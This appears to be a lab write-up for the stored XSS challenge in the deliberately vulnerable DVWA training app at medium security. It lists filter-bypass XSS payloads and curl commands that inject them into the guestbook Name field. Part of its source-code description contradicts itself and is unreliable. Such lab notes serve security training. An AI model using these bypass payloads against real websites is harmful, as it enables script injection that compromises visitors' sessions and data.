# DVWA XSS (Stored) — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_s/

## Source Code Behavior (Medium)
- Name: `str_replace('<script>', '', $name)` + `htmlspecialchars($name)` — WAIT, actually:
  - Name field: `strip_tags()` then `addslashes()`
  - Message field: `strip_tags()` then `htmlspecialchars()`
- Actually in DVWA medium:
  - Message: `htmlspecialchars()` applied — XSS blocked in message
  - Name: Only `str_replace('<script>', '', ...)` — same weak filter as reflected medium

## Key Differences from Low
1. Message field is properly escaped with `htmlspecialchars()` — can't inject there
2. Name field uses `str_replace('<script>', '', ...)` — weak, bypassable
3. Name field still has `maxlength="10"` client-side restriction

## Working Payloads (Name field only, bypass maxlength via intercepted request)

### Case bypass
```
<Script>alert(1)</Script>
```

### Nested bypass
```
<scr<script>ipt>alert(1)</script>
```

### Event handler
```
<img src=x onerror=alert(1)>
```

## Step-by-Step Exploitation
1. Try XSS in Message field — blocked by `htmlspecialchars()`
2. Intercept POST request to modify Name field (bypass maxlength)
3. Set Name to `<Script>alert(1)</Script>` or `<img src=x onerror=alert(1)>`
4. Submit — stored XSS fires on every page load

## curl Commands
```bash
# Case bypass in name field
curl -X POST "http://127.0.0.1:4280/vulnerabilities/xss_s/" \
  -d "txtName=<Script>alert(1)</Script>&mtxMessage=normal+message&btnSign=Sign+Guestbook" \
  -b "PHPSESSID=<session>;security=medium"

# Event handler bypass in name field
curl -X POST "http://127.0.0.1:4280/vulnerabilities/xss_s/" \
  -d "txtName=<img src=x onerror=alert(1)>&mtxMessage=normal+message&btnSign=Sign+Guestbook" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- Attack vector shifts from Message to Name field
- Must bypass client-side maxlength (intercept HTTP request)
- Same `str_replace` bypass techniques as reflected XSS medium
